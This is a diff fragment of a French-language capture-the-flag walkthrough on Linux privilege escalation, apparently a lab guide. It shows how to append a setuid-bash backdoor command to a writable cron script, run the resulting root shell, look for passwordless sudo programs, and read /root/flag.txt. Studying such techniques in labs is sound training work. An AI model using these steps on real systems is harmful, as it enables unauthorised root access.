@@ -48,3 +48,13 @@ Vérifiez si des scripts ou commandes exécutés par cron peuvent être manipul�
 Si un script exécuté par cron est modifiable, insérez une commande pour obtenir un shell root.
 1. Par exemple, si myscript.sh s'exécute chaque minute :
 - ```echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /path/to/myscript.sh```
+2. Attendez que le cron s'exécute, puis lancez /tmp/rootbash -p pour obtenir un accès root.
+#### Exécuter une commande de privilège escalation
+1. Utilisez des commandes comme sudo si elles sont accessibles.
+- ```sudo -l```
+2. Si un programme peut être exécuté avec sudo sans mot de passe, exploitez-le pour obtenir un shell root.
+
+### Vérification et Capture du Drapeau
+1. Une fois root, accédez au fichier flag en utilisant :
+- ```cat /root/flag.txt```
+2. Notez le contenu du drapeau pour valider l’accès root.
